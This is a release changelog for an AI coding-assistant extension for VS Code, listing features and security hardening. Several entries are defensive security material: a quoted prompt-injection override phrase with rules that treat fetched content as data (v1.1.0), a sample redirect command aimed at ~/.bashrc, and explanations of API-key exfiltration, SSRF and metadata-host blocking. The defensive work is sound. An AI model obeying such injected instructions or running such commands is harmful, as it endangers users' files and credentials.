- When the agent calls `capture_screen`, the screenshot is now **injected into the conversation as an image on the next round**, so the model actually **sees** it and can analyze/describe what's on your screen — not just display it. Ask "look at my screen and tell me what's wrong" in an agent mode and it works end to end.
- Mechanism: tool results are text-only, so a tool-produced image is drained after the tool round and appended as a user image message (the same `image_url` block normal attachments use). The tool description no longer tells the model it "can't see the pixels" — it can, next turn — which also curbs the reflexive refusal. Still shown inline to you as well.

## 1.11.0

### New — agents can screenshot your screen on request (`capture_screen` tool)

- Asking in plain language — "paste a screenshot of my main monitor" — now works in agent modes: a new `capture_screen` tool grabs your screen and shows it inline, instead of the model saying "I can't insert images." (Previously screen capture existed only as the `/screenshot` command and the 📷 button, which the model couldn't invoke.)
- The system prompt now tells the model it *can* capture the screen: via the tool in agent modes, and by pointing you to `/screenshot` or 📷 in plain Chat mode — so it stops flatly refusing. The image is shown to you; the model gets only a confirmation (it can't read the pixels from a tool result). Excluded from Plan mode and subagents.

## 1.10.0

### New — Mermaid diagrams render inline

- ` ```mermaid ` code blocks in replies now **render as diagrams** in the chat (flowcharts, sequence, class, ER, state, gantt, mind maps, …). Ask any model "draw the architecture as a diagram" and you get a rendered figure, not a code block. Diagrams follow your light/dark theme.
- Together with v1.9's `generate_image`, this gives you both halves cleanly: **Mermaid for precise technical diagrams**, **`generate_image` for illustrations/pictures** — and models are told which to use for what.
- **Lazy-loaded to stay fast:** Mermaid (~3 MB) is a separate chunk (`dist/mermaid.js`) that the webview loads **only when a diagram first appears**, injected past the CSP with the page nonce — so the main chat UI's load time is unchanged for everyone who isn't rendering a diagram. Invalid diagram syntax falls back to showing the code block.

## 1.9.0

### New — agents can create images/figures (`generate_image` tool)

- Any agent (any chat model, in an agent mode) can now **produce a figure when you ask for one**: a new `generate_image` tool takes a description, generates the image via the gateway's image model (`gpt-image-1`), and shows it **inline in the chat**. "Create a logo for this project", "illustrate this concept" — the image appears in the conversation. Image synthesis is delegated to the image model, so it works no matter which model you're chatting with.
- Excluded from Plan mode and subagents (it produces output / costs), and it fails gracefully with a clear message if your account has no image model. For precise technical diagrams (flowcharts, ER, architecture) the tool description steers models to a Mermaid code block instead. The palette command **`Parley: Generate Image`** (saves to disk too) is unchanged.

## 1.8.0

### New — `/screenshot`: capture your screen straight into the chat

- **`/screenshot`** grabs your whole screen with **no OS picker** and attaches it to the composer as an image — then just type your question and send. This is what `/computer "paste a screenshot here"` was reaching for: computer use is a mouse/keyboard control loop with no clipboard or attachment access, so it can't do this; `/screenshot` uses the same screen-capture backend directly.
- Read-only (pixels only, no input injection), so it needs no computer-use consent — just a capture backend (nut.js if installed, else the built-in Windows one). For a specific window or region, the **📷** button (OS picker) remains the right tool.

## 1.7.0

### Improved — computer use: visible progress, reasoning, and much lower latency

- **You can now see what it's doing between actions.** The loop shows a live status line for each phase — "🖥 Step N: capturing the screen…" then "…analyzing the screen…" — so a slow model call reads as *working*, not stuck.
- **The model's reasoning is surfaced.** Each step now asks the model for a short `reason` ("the Overlays dropdown is top-right; clicking it to open") and shows it under the action in the chat, so the loop is transparent rather than a black box.
- **Big speedup on the nut.js backend.** Screenshots are now downscaled to 1280px before being sent to the model (was full-resolution — e.g. ~2 MB at 4K/HiDPI, now ~360 KB), which sharply cuts upload and inference time per step. Done with jimp (already bundled by nut.js — no new dependency) and fully guarded: any failure falls back to the full-resolution image. The PowerShell backend already downscaled.

## 1.6.1

### Fixed — mode button contrast

- The mode button (**Chat ▾** / Ask / Edit / … next to the model dropdown) now has a black background with white text, so it's clearly readable instead of blending into a light background.

## 1.6.0

### New — ⚙️ settings button, and flat composer icons

- Added a **⚙️ settings** button to the composer toolbar (right of 🖱️ computer control) that opens VS Code Settings filtered to Parley's section — one click to `parley.*`.
- **Fixed the white background** behind the composer icon buttons (🎤 🗣 📷 🎥 🖱️ ⚙️): they now share the flat/transparent style of 📎, with a subtle hover, instead of rendering as filled buttons.

## 1.5.0

### New — `Parley: Usage History`

- A webview panel that aggregates the per-conversation token/cost **estimates** Parley already records into an at-a-glance view: total spend/tokens/conversations, a **30-day cost-per-day bar chart**, and a **by-model breakdown** table — across this workspace and every repo in the global registry. Answers "where has my spend gone?" without leaving VS Code.
- Each conversation's tokens + estimated cost are now persisted in its `.parley` index entry (on autosave), so the view is instant and needs no re-parsing of transcripts. This is the local estimate over time; **`Parley: Show Usage`** remains the authoritative billed figure from the gateway. Pure aggregator is unit-tested.

## 1.4.0

### New — `@sym:` mention (find a symbol by name)

- Type **`@sym:name`** in the composer to search your workspace's **functions, classes, and other symbols** via the language server, then attach the chosen symbol's source. "Explain `@sym:resolveMentions`" pulls in exactly that function, no matter which file it lives in.
- Implemented as sugar over the existing file+range mentions: a picked symbol inserts a `@path#startLine-endLine` mention, so the existing resolver attaches its lines at send time — no new resolution path, no new attachment type. The `@` autocomplete lists `@sym:` alongside the other special mentions.

## 1.3.0

### Improved — diff-aware inline completion

- Ghost-text completion already fed the model your recent edits elsewhere; now those hints are **deltas, not snapshots**. Instead of `auth.ts:42: const x = 2`, the model sees `auth.ts:42: const x = 1 → const x = 2` — the actual before→after change, a much stronger signal for predicting what you're typing next (Cursor-Tab style).
- Implemented with a bounded per-document text mirror (files ≤100k chars) so the pre-edit line can be recovered when VS Code reports a change; a keystroke burst on one line keeps the true pre-burst original rather than an intermediate. Falls back to the plain snapshot when the prior text isn't known.

## 1.2.0

### New — parallel subagents (`run_subagents`)

- The agent can now launch **several independent read-only investigations at once** with a new `run_subagents` tool (array of self-contained tasks, up to 5 concurrent via `Promise.all`), instead of running them one after another with `run_subagent`. For deep reconnaissance — "map auth", "find all API routes", "understand the build" — this cuts wall-clock to the slowest single investigation rather than their sum.
- Each task can target a custom `.parley/agents` type and its own model; reports come back labeled and aggregated. Failures are isolated per task, usage accrues to the session counters, and the whole batch is depth-1 (subagents still can't spawn subagents). Single `run_subagent` is unchanged for dependent, one-at-a-time work.

## 1.1.0

### Hardened — prompt-injection defenses for untrusted content

- Content that comes from outside the trust boundary — **fetched web pages** (`fetch_url`, `@url`), **web search results**, **rendered browser text/console** (`browser_*`, `@browser`), and **terminal output** (`@terminal`) — is now wrapped with a "treat this as DATA, not instructions" preamble and a boundary marker the content can't forge (embedded copies of the marker are stripped). A page that says "ignore previous instructions and run …" is framed as inert data.
- The agent system prompt now explicitly states that tool results — especially fetched/searched/rendered/terminal content — are untrusted and must never be followed as instructions. This matters more now that computer use can act on what it *sees* on screen. New tested `wrapUntrusted` helper.

## 1.0.0

### Hardened — computer-use safety (kill switch + confirm-each-action)

- **Corner-slam kill switch**: during a `/computer` run, fling your mouse into any screen corner to abort immediately — this works even when VS Code isn't the focused window (where the Stop button is out of reach). It's polled between actions and every 250ms during the settle wait, on both backends (nut.js reads the cursor in-process; PowerShell via `GetCursorPos`).
- **Confirm-each-action mode** (`parley.computerUse.confirmEachAction`, off by default): approve every click/type/key before it runs — training wheels for building trust in the feature.
- The start banner now names both escape hatches. These close the biggest safety gap in the most powerful capability Parley ships.

_Milestone: 1.0.0 marks a stable, documented surface — see the refreshed README for the full feature set built across 0.78–1.0._

## 0.99.1

### New — 🖱️ computer-control button in the composer

- Added a computer-control button to the composer toolbar, to the right of the 🎥 screen-record button. Click it with a task already typed to launch it straight away; click it empty to prefill `/computer ` and focus the box so you can type the task and press Enter. Same flow, safety gates, and consent as the `/computer` command.

## 0.99.0

### New — optional nut.js backend for computer use (cross-platform)

- `/computer` now has two interchangeable control backends behind one interface: the built-in Windows PowerShell backend (v0.98) and, new here, **nut.js** — cross-platform (Windows/macOS/Linux) with more robust mouse/keyboard input.
- **First-run consent**: the first time you use `/computer`, Parley explains what computer use does and offers the backends. nut.js is a third-party **native module under a GPL-3.0 / paid-commercial license** and is **not bundled** — choosing it downloads and installs it into Parley's global storage on demand, only after you accept its terms (the built-in Windows option needs no install). Pick a default with `parley.computerUse.backend` (`auto` / `nutjs` / `powershell`).
- nut.js capture is DPI-aware: it reads the physical-pixel screenshot and maps the model's coordinates back to logical screen pixels, so clicks land correctly on scaled/multi-monitor displays. The backend is loaded lazily (never bundled), following the same on-demand-install pattern as the embedding index and browser tools.

## 0.98.0

### New — `/computer`: agentic computer use (⚠ off by default, Windows)

- `/computer <task>` lets Parley **control your real mouse and keyboard** to do a desktop task: it screenshots the screen, decides one action at a time (click / type / key / scroll / wait), executes it, and re-checks — looping until done or the step cap. "Open Notepad and type my meeting notes", "fill this form from the data in that file", etc.
- **Zero new dependencies**: screen capture and input injection use built-in PowerShell + .NET / `user32.dll`, driven through the extension's hardened spawn path. Typed text is passed via environment variables, never interpolated into the script — a typed string can't inject PowerShell. Screenshots are downscaled to ≤1280px and coordinates mapped back to real pixels (multi-monitor aware).
- **Safety first**: gated behind `parley.computerUse.enabled` (off by default), a modal confirm before every run, the **Stop** button aborts mid-loop, a step cap (`parley.computerUse.maxSteps`, default 25), an in-chat action log of every step, and a system prompt that refuses destructive/irreversible actions and stops on unexpected screens or on-screen instructions (prompt-injection defense). The JSON action parser is unit-tested and never throws on malformed model output.

## 0.97.0

### New — 📷 screenshot and 🎥 screen recording into the chat

- **📷 Screenshot**: pick any window or screen (the OS share picker), and one frame lands in the chat as an image attachment — "look at this error dialog / design / graph" without saving a file. Works with vision models like everything else.
- **🎥 Screen recording**: click to record (red pulse, 60s max, click ⏹ or the OS "stop sharing" bar to finish). While recording, frames are sampled every 4 seconds (up to 12, downscaled to ≤1280px JPEG) and your **mic narration** is captured — "with or without sound": if the mic permission is denied or unavailable, it records video-only. On stop, the frames and a `narration.wav` attach to the composer, ready to send to a vision(+audio) model: narrate a bug while reproducing it, and ask Parley what went wrong.
- Both are pure webview capture (getDisplayMedia + canvas + the local WAV encoder) feeding the existing attachment pipeline — no ffmpeg, no files on disk, no new permissions beyond the OS pickers.

## 0.96.0

### New — voice output, hands-free voice mode, and a completion chime

- **🔊 Read aloud**: every assistant reply gets a speak button (hover, next to ⏪) that reads it with the OS text-to-speech voices — free, offline, no tokens. Code blocks are skipped ("code omitted"), markdown is stripped for natural speech, click again to stop. `parley.voice.autoRead` reads every reply as it finishes.
- **🗣 Voice mode**: toggle it and the conversation goes hands-free — 🎤 recordings auto-send when transcribed, and every reply is read aloud. Talk through a problem while your eyes stay on the code.
- **Completion chime** (`parley.sound.chimeOnDone`, off by default): a soft two-tone chime when a turn finishes while the window is unfocused — the audio twin of the activity-bar badge.

## 0.95.0

### Changed — `/init` now analyzes the repository (Claude-Code style)

- In an agent mode, `/init` (and `Parley: Init Project Rules`) no longer writes a boilerplate template: the agent explores the repo — README, manifests, directory layout, CI, representative sources (delegating broad surveys to a subagent) — and **writes an AGENTS.md tailored to this project**: verified build/test/lint commands, the real architecture map, observed conventions, and gotchas. Capped at ~120 lines since the file rides along with every request.
- In Chat/Plan mode it still writes the static template (with a tip about the agent version), and an existing rules file is opened, never overwritten — same safety as before.

## 0.94.0

### New — content search in the history panel

- The 🕘 history panel's filter box now searches **inside conversations**, not just titles: type 3+ characters and the host greps the on-disk transcripts (debounced, cached, both This-repo and All-repos scopes), ranking title matches first and content matches after — each content hit showing an italic snippet of the surrounding text under the row. Fewer than 3 characters keeps the instant client-side title filter.
- Stale-response guards (sequence tokens, scope checks) keep fast typing race-free; disk reads stop once 50 hits are found.

## 0.93.0

### New — 🎤 voice input

- A mic button in the composer: click to record (red pulse, 60s max), click again to transcribe — the text lands at your caret, ready to edit or send. Audio is captured as raw PCM in the webview and encoded to 16 kHz mono WAV locally (no MediaRecorder/webm, which the gateway wouldn't accept).
- Transcription runs through an audio-capable model — the current chat model by default, or pin a cheap one with `parley.voice.model` (OpenAI/Google models accept audio). Tokens/cost accrue to the session counters like everything else; failures surface a clear warning (including the first-use microphone permission case).

## 0.92.0

### New — `Parley: Review Staged Changes` (in the Source Control menu)

- One click from the Source Control view's ··· menu (next to Parley's commit-message generator, now also there): reviews exactly what you're about to commit — staged diff, falling back to the working tree when nothing is staged — reporting bugs, risky edge cases, leftover debug code, and security issues by severity with `file:line` references, and ending with a suggested Conventional Commits message.
- Completes the git review trio: **staged** (pre-commit) · `@git` mention (working tree, in-chat) · **Review Current Branch** (committed work + PR description).

## 0.91.0

### New — "Fix with Parley" when a terminal command fails

- When an integrated-terminal command exits non-zero (captured via shell integration), a **transient status-bar hint** — ⚠ *Fix with Parley* — appears for 30 seconds; clicking it sends the command, exit code, and captured output into the chat for a diagnosis and fix (in agent modes, Parley can edit the offending files directly). Ctrl+C cancellations (exit 130) are ignored. Toggle with `parley.terminalFixHint.enabled`.
- The command **`Parley: Fix Last Terminal Command`** works any time, hint or not. The terminal twin of the diagnostics lightbulb.

## 0.90.0

### New — agent-maintained project memory

- New **`remember` tool**: when the agent learns a durable, non-obvious fact ("integration tests need Docker", "deploys run from scripts/ship.ps1", a preference you stated), it saves one concise sentence to **`.parley/memory.md`** — and every future conversation starts with that memory injected into the system prompt (like project rules, capped at 8k chars). Knowledge now compounds across conversations.
- Guardrails: exact duplicates are rejected, entries cap at 200 (oldest dropped), the tool description forbids secrets and task-local trivia, subagents can't write memory, and the file is plain markdown you own — **`Parley: Open Project Memory`** opens it for review/pruning (your own prose in the file is preserved when the agent appends).

## 0.89.0

### New — `Parley: File Edit History`

- "What did the agent do to this file?" — answerable outside the chat. The command (also in right-click → Parley) lists every checkpointed Parley edit to the current file **across all conversations** (newest first, with the edit label, timestamp, and conversation title) and opens a **before ⇄ after diff** for the one you pick. "After" is reconstructed from the next-newer checkpoint (or the file's current content for the latest edit).
- Note: VS Code's Timeline provider API is still proposed-only, so this ships as a command + context-menu entry rather than a Timeline lane; if that API stabilizes, these same checkpoints can feed it directly. Checkpoint logs live in `.parley/checkpoints/` and persist until reverted or rewound.

## 0.88.0

### New — `Parley: Review Current Branch`

- Reviews your branch's committed work: finds the merge-base with `origin/main` / `origin/master` / `main` / `master`, gathers the commit list, diffstat, and diff (capped at 30k chars with the stat as full-scope fallback), and streams a severity-grouped code review **plus a ready-to-paste PR title & description** into the chat.
- Complements the existing `@git` mention (uncommitted changes) — the command tells you so when the branch has no commits beyond the base. Multi-repo workspaces get the same repo picker as commit-message generation (now shared helpers).

## 0.87.0

### New — `/verify`: fix until green

- **`/verify`** (agent modes only) runs the project's check command, and on failure the agent reads the output, makes the smallest safe fix, and re-runs — looping until the command passes or it explains what's blocking. Explicitly instructed never to weaken or delete tests to force a pass. All the usual safety rails apply: command approval in Ask/Edit modes, checkpointed (revertible) edits, bounded rounds, and Stop.
- Command resolution: `/verify <command>` inline → `parley.verifyCommand` setting → auto-detect (`npm test` when the workspace `package.json` has a real test script). In Chat/Plan mode it politely points you to an agent mode instead.

## 0.86.0

### New — Parley editor submenu + getting-started walkthrough

- **Right-click → Parley** in any editor now offers the full toolkit in one tidy submenu: Ask About Selection, Edit Selection (Inline), Refactor Selection, Add Selection to Chat (selection-gated), plus Explain Current File, Generate Tests, Fix Diagnostics, and Add File to Chat. Explorer and editor-tab context menus unchanged.
- **Getting-started walkthrough** (Help → Get Started → "Get started with Parley", auto-offered on install): five steps — connect your API key, open the chat, give it context (@-mentions), pick a mode, and power tools (slash commands, custom commands/subagents, Apply buttons, lightbulb fixes) — with completion tracking for the setup steps.

### Release automation (no code change)

- Adopted tagging: pushing a `v*` tag now runs the existing Release workflow (build → test → GitHub Release with the VSIX attached). v0.85.0 is the first automated release: https://github.com/facazevedo/parley-vscode/releases. Marketplace/Open VSX publishing stays off until the corresponding secrets are set.

## 0.85.0

### New — `/compare`: side-by-side model comparison

- Type **`/compare`** (reuses your last message) or **`/compare <prompt>`**, pick a second model from the in-panel menu, and Parley runs the same prompt — same system prompt, conversation history, and thinking settings — on your current model and the picked one in parallel (chat-only, no tools). The two replies render side by side in a card (columns stack when the panel is narrow), fully markdown-rendered with the usual code-block Copy/Apply buttons.
- **"Use this reply"** adopts a column into the conversation as if it were the assistant's answer — follow-ups build on it, the card marks the winner "✓ adopted", and the choice survives reload/fork (the adopted pair is reconstructed into history from the transcript).
- Runs under the turn lifecycle: the composer shows busy, **Stop** cancels both requests, both responses' tokens/cost hit the session counters (and the status-bar ticker). One side failing still leaves the other adoptable; both failing records a note. Comparisons persist in the transcript and export to Markdown/plain text (with the adopted marker), covered by tests.

## 0.84.0

### New — status-bar cost ticker + unread-reply badge

- **Status bar**: a right-side item shows the sidebar conversation's session tokens and estimated cost (`✦ 12k · ~$0.42`), flipping to a spinner ("Parley working…") while a turn runs — including during subagent activity, which the webview header previously under-reported live. Click it to focus the chat. Toggle with `parley.statusBar.enabled` (default on). Tab conversations don't drive it — they're visible editors with their own header.
- **Activity-bar badge**: when a reply finishes while the Parley view is hidden, the Parley icon gets a numbered badge (like unread counts); it accumulates per finished turn and clears the moment you open the view.

## 0.83.0

### New — custom subagents (`.parley/agents/*.md`)

- Define your own subagent types: a `security-reviewer.md` under `.parley/agents/` becomes an agent type the model can delegate to via `run_subagent`'s new optional `agent` parameter. Frontmatter `description:` is what the model reads when choosing; optional `model:` runs that subagent on a different (e.g. cheaper or stronger) model; the body is the subagent's extra system prompt.
- The `run_subagent` tool schema is rebuilt every turn, so adding/editing an agent file takes effect on the next message. The custom prompt is **appended** to the built-in read-only investigator preamble — custom agents can shape focus and reporting style but stay read-only (no file edits, no commands, no recursion), and an unknown `agent` value falls back to the default investigator with a corrective note instead of wasting the round.
- Subagent token/cost accounting is now attributed to the model that actually ran (matters with a `model:` override). Loader + schema builder are unit-tested; `/help` documents the format.

## 0.82.0

### New — terminal-style prompt history in the composer

- **ArrowUp** in an empty composer recalls your previous prompts (newest first); **ArrowDown** walks back toward the newest and then restores whatever you had typed; **Esc** exits recall and restores your draft. Typing exits recall and keeps the recalled text for editing.
- Careful not to fight existing keys: the slash menu and @-mention menu still own the arrows while open, and in a multi-line draft ArrowUp only recalls from the first line (ArrowDown from the last) — otherwise the cursor moves normally.
- History persists across reloads (last 50 prompts, consecutive duplicates collapsed, stored per workspace) and is shared between the sidebar and tab conversations.

## 0.81.0

### New — "Fix with Parley" in the lightbulb menu

- Any line with a squiggle now offers **Fix with Parley** in the Quick Fix lightbulb (`Ctrl+.`), next to the language's own fixes. It sends the *specific* diagnostics under the cursor — up to 5, deduped, Hints excluded — with a line-numbered excerpt of the offending code (±3 lines per diagnostic, merged and capped), plus the current file as context, and the reply streams into the chat.
- One bundled action, never a spam list: a single diagnostic shows its message in the title ("Fix with Parley: Type 'number' is not…"), several show "Fix N problems with Parley". Parley never marks itself as the *preferred* fix, so it won't hijack auto-fix flows.
- The palette command `Parley: Fix Diagnostics` (whole file, all diagnostics) is unchanged. New internal command `parley.fixDiagnostic` carries the lightbulb arguments; prompt builder is unit-tested.

## 0.80.0

### New — Apply button on chat code blocks

- Fenced code blocks in assistant replies now have an **Apply** button next to Copy: it proposes replacing the active editor's selection (or inserting at the cursor when nothing is selected) with the block, shown as the usual in-chat diff card — you preview the exact change and confirm, and the edit goes through checkpoints (`Parley: Revert Last Edit` works). Model-free and instant: what you see in the diff is exactly what's written.
- Skipped for prose/terminal fences (`text`, `diff`, `console`, `markdown`, …). If the target file has unsaved changes it is saved first so the diff is truthful. Editors outside the workspace (or no editor) get a clear warning instead of a card.

## 0.79.0

### Improved — custom slash commands: descriptions, $SELECTION, global commands

- **`description:` frontmatter** in a custom command's `.md` file now shows in the composer's slash menu (instead of the generic "custom command"), same format as output styles.
- **`$SELECTION` placeholder** — expands to the active editor's selected text at run time ($SELECTION is expanded before `$ARGS`, so arguments containing the literal string stay intact). Empty selection expands to nothing.
- **Global commands**: `~/.parley/commands/` and `~/.claude/commands/` are now scanned in addition to the workspace dirs; workspace commands shadow global ones on a name clash. Commands also work with no folder open.
- Fixed a latent lookup bug: a command discovered in `.claude/commands` could previously be *run* from a same-named file in `.parley/commands` — each command now remembers exactly which file it came from. Frontmatter is stripped from the prompt body. New shared loader `src/config/customCommands.ts` (unit-tested), reusing the output-styles frontmatter parser.

## 0.78.0

### Changed — every icon popup is now a concise in-panel dropdown (like the history panel)

- **⊟ Compact** (and clicking the context meter, and `/compact`) now shows its two options — *Summarize older, keep recent* / *Summarize everything* — in a compact dropdown anchored to the chat area instead of the big screen-centered QuickPick.
- **⤓ Export** picks the format (Markdown / plain text / JSON) in the same in-panel dropdown; only the native save dialog remains.
- **💰 Usage** (and the header cost readout) fetches this month's billed spend and shows it right in the panel — cost, requests, tokens, period — with an inline **Change account id…** input instead of an input box + notification toast.
- **⏪ Rewind** on a message opens the conversation/files/both choice in-panel too.
- **History panel**: ✎ rename is now an inline input in the row (Enter saves, Esc cancels), and 🗑 delete confirms inline ("Delete?" — click again) — no more floating input box or modal dialog.
- All dropdowns share one component: arrow-key navigation, Enter to pick, Esc / click-away to dismiss, and the trigger icon toggles it. The command-palette versions of these commands keep their native pickers.

## 0.77.0

### New — end-of-turn "changed files" summary with a Review action

- When a turn edits files, Parley now shows a summary card — **"N files changed +X −Y"** with a per-file breakdown and a **Review** button — instead of the old plain-text "Changed N files" note. Counts are the true net diff of each file (its pre-turn checkpoint vs. its current contents). **Review** opens each changed file as a before/after diff (checkpointed original ↔ current). The card is part of the transcript, so it persists on reload and appears in Markdown/plain-text exports.

## 0.76.0

### New — manage conversations from the history panel; click the meter to compact

- **Rename / archive / delete** any conversation directly in the in-panel history: hover a row for ✎ rename, 🗄 archive, 🗑 delete (with a confirm). Archived conversations are hidden until you toggle **Archived** in the panel header; renames persist (kept in the index and re-applied when the conversation is reopened). Acting on the live conversation works too — deleting it starts a fresh one. Backed by new `store.ts` ops (`renameConversation` / `setConversationArchived` / `deleteConversation`).
- **Click the context-window meter** (the ◔ ring in the header) to compact the conversation — the same keep-recent / summarize-all prompt as the ⊟ button, now one click from the usage indicator.

## 0.75.0

### Changed — in-panel conversation history (was a floating picker)

- **🕘 Past conversations** now opens as a concise dropdown anchored to the top of the chat area — aligned with the panel, Claude-Code style — instead of the big screen-centered VS Code QuickPick. Filter-as-you-type, arrow-key navigation, Enter to open, Esc / click-away to dismiss.
- **Scope toggle: "This repo" (default) / "All repos".** By default it lists only the current workspace's conversations (like Claude Code). Switch to **All repos** to browse conversations from every workspace you've used Parley in (like Codex) — each row shows a repo badge. This is powered by a new global base registry (`bases.json` in the extension's global storage), updated on autosave; opening a cross-repo conversation loads its full transcript and binds its checkpoints under its own `.parley`.
- The command-palette **`Parley: Open Past Conversation`** still opens the full QuickPick (with transcript full-text search) for those who prefer it.

## 0.74.1

### Hardened — child-process spawning (removes Node DEP0190; shrinks injection surface)

- Every child-process spawn that needed a shell to resolve Windows `.cmd`/`.bat` shims previously used `spawn(cmd, argsArray, { shell: true })`, which Node deprecates (DEP0190) because array args are concatenated into the shell line **unescaped**. A new shared helper (`src/util/childProcess.ts` → `spawnResolved`) fixes this: on POSIX it spawns the binary directly with no shell; on Windows it passes a single, explicitly **quoted** command string (no args array), so shims still resolve but nothing is concatenated unescaped. Applied to the npm runtime installs (`runtimeInstall.ts`) and — more importantly, since it takes user config — the **MCP stdio transport** (`McpManager.ts`). This also means a workspace-configured MCP command's arguments are quoted rather than injected. (The DEP0190 you may still see during `npm run test:integration` comes from the `@vscode/test-electron` dev harness, not shipped code.)

## 0.74.0

### New — opt-in error reporting

- **`Parley: Report an Issue`** — a privacy-first, user-in-the-loop error channel. Extension errors are captured into a small in-memory ring (bounded, and run through the secret scanner + home-path stripping before storage), and the command assembles a report — environment + recent sanitized errors — that you **review** in an editor tab, then choose to **copy** or open as a **prefilled GitHub issue**. Nothing is ever transmitted automatically; there is no telemetry endpoint. This gives maintainers real diagnostics without compromising the privacy stance (telemetry stays off by default).

### Hardened — on-demand runtime installs on locked-down machines

- The two opt-in features that fetch a native runtime on first use (the local `@codebase` embedding index and the browser tools) now **preflight that `npm` is actually runnable** and **time-box the install** (5 min for the embedding runtime, 10 min for Chromium). On a machine with no `npm`, no network, or a blocking proxy, they now fail fast with an actionable message ("this feature is optional; everything else works") instead of a progress notification that spins forever. Shared, tested helper (`src/util/runtimeInstall.ts`).

## 0.73.0

### New — usage visibility

- A **💰 usage button** in the chat header (and a click on the session-cost readout) opens **Parley: Show Usage** — your real billed spend for the month — so it's no longer buried in the command palette.
- A new **soft-budget warning**: set `parley.usageWarnUsd` and Parley posts a one-time notice in the conversation once its estimated spend crosses that amount, nudging you to `/compact` or start fresh. Off by default. (A true "% of weekly plan" gauge isn't possible yet — the Parley gateway's usage API doesn't expose a plan limit.)

### Production-readiness hardening

A deep multi-agent review of the whole extension surfaced 40 confirmed defects (each adversarially re-verified before fixing). This release fixes all of them.

**Security**

- **Command allowlist no longer approves output redirection.** A remembered `git log` rule would auto-run `git log > ~/.bashrc`; `hasRedirection` now disqualifies any un-quoted `>`/`<`/`>>` from auto-approval and from "Always Allow" (`commandSafety.ts`).
- **Write tools can't escape the workspace.** `write_file`/`edit_file`/`multi_edit` resolved a `..`-traversal path through a fallback that rebuilt the escaping absolute path; they now hard-fail with "path is outside the workspace" (`toolExecutor.ts`). The same guard now covers `@`-mention reads, `@codebase`, and chat-mode `File:`/diff Apply cards.
- **Private keys are fully redacted.** The PEM pattern matched only the `-----BEGIN-----` header, so the key body still shipped; it now spans the whole block (`secretScanner.ts`).
- **Inline completion skips sensitive files.** Typing in `.env`/`*.pem`/`id_rsa` no longer sends surrounding text (or records recent-edit lines) to the gateway (`inlineCompletionProvider.ts`, `recentEdits.ts`).
- **`grep` honors the same sensitive-file denylist** as every other tool (was excluding only a narrow hardcoded set, leaking `.npmrc`/`credentials.json`/`secrets.*`).
- **`fetch_url` SSRF protection** — rejects private/loopback/link-local hosts and re-validates every redirect hop. **`browser_navigate`** blocks the cloud-metadata range (`169.254.169.254`, `metadata.google.internal`) while still allowing localhost dev servers.
- **Symlink containment** — workspace-relative resolution now canonicalizes with `realpath`, so an in-tree symlink to `/etc/passwd` can't be read.
- **`/v1/files` uploads get the same secret redaction** as inline context (was bypassed for large text attachments).

**Data-loss & correctness**

- **Stop keeps the partial reply.** Clicking Stop mid-stream previously erased the entire streamed answer; it's now preserved in the transcript.
- **No concurrent turns.** Two fast sends (or a send during slow context gathering) could launch overlapping turns with interleaved output; the busy guard now covers the whole pre-execute window.
- **Regenerate no longer duplicates** the user message / strands the old answer (transcript is trimmed in sync with history).
- **Stop cancels compaction** (including auto-compaction), which previously ran with an inert Stop button.
- **Transcript & index writes are serialized and atomic** (temp-file + rename), fixing a concurrent-append/rewrite race that could silently drop events, and an index read-modify-write race that could drop a conversation from the history picker.
- **Reverts are guarded and serialized** — a "Revert All" during an agent turn can no longer undo a just-applied edit; all checkpoint mutations run through one FIFO queue.
- A **literal `<DONE>` in prose/code** is no longer stripped or treated as turn completion (anchored to end-of-message).
- Auto-continue past the tool-round cap now **carries forward the tool findings** instead of forgetting what it read.
- Subagent file reads no longer satisfy the parent's write-clobber guard for files the parent never saw.

**MCP**

- `dispose()` and unexpected server exit now **reject in-flight calls** instead of hanging the turn for 30s (or forever).
- Tool names are **sanitized and length-bounded** to a valid function-name shape, so one oddly-named tool can't 400 the whole turn; malformed `inputSchema` is normalized; server-name collisions are skipped with a warning; on Windows the whole process tree is killed (no orphaned server).

**Diff engine**

- Unified-diff hunks apply at the **line indicated by `@@`** (not the first matching text), fixing wrong-location edits in files with duplicate blocks.
- CRLF files no longer render a one-line edit as a **full-file rewrite** in the review card.
- Diffs that **create (`/dev/null` →) or delete (→ `/dev/null`)** a file are handled instead of being silently dropped or turned into an emptied file (deletions are checkpointed/revertible).

**Context / ignore rules**

- `.gitignore` entries **without a trailing slash** (`node_modules`, `dist`) now exclude their subtree; **negation (`!`) lines** are honored (an allowlist-style ignore file no longer blanks out all context). `@codebase` now respects `.gitignore`/`.parleyignore`.

**Reliability & UX**

- Fixed listener leaks (per-tab save/selection listeners disposed), a mid-turn full re-render that truncated the live reply, an O(n) markdown re-parse on every state update (now memoized), the composer discarding a typed prompt when a turn is refused (now restored), Memento bloat from re-serializing the transcript on every step (coalesced while streaming), a leaked HTTP stream socket on mid-stream errors, per-message token undercounting on multi-round turns, and "Generate Commit Message" targeting the wrong repo in multi-repo workspaces.

## 0.72.1

### Security — honor VS Code Workspace Trust

- **A malicious repository can no longer hijack Parley through its checked-in `.vscode/settings.json`.** Four settings can execute code or redirect where your API key is sent, and were previously honored from any workspace: `parley.endpoint` (the Bearer API key is sent to whatever URL this points at — an attacker value exfiltrates your key on the next message), `parley.hooks` (runs shell commands at prompt/tool lifecycle points), `parley.mcpServers` (spawns subprocesses), and `parley.video.ffmpegPath` (executes that binary). The extension now declares `capabilities.untrustedWorkspaces` with these as `restrictedConfigurations`, so in an **untrusted** workspace their workspace-scoped values are ignored and your user-level settings are used instead; trusting the workspace restores full configurability. Chat and everything else keep working untrusted — only these four settings are gated.

### Fixed

- `parley.context.maxCharacters` and `parley.inlineCompletion.debounceMs` are now range-clamped like every other numeric setting, so a negative/zero/NaN value can't degrade context truncation or completion timing.

## 0.72.0

### Context UX — fuzzy mentions, selection pill, line ranges, right-click, drop anything

- **Fuzzy @-mention autocomplete** — the dropdown now uses a real fuzzy scorer (`@chpanel` finds `ChatPanel.ts`) with bonuses for basename hits, word-boundary/camelCase alignment, and consecutive runs; files open in the editor rank first. Candidates are cached (~15 s TTL) instead of re-globbing per keystroke, results carry a sequence token so out-of-order responses can't render stale suggestions, and the dropdown now also offers **folders** (`@src/`) and the **special mentions** (`@codebase`, `@git`, `@terminal`, `@browser`) with a one-line hint each.
- **Selection pill** — the composer shows `file.ts:12-40 selected` with a 👁 toggle whenever an editor selection would ride along with the next prompt (the "Selection" checkbox was previously invisible inside the collapsed Context disclosure). Context checkbox choices now **persist across reloads**.
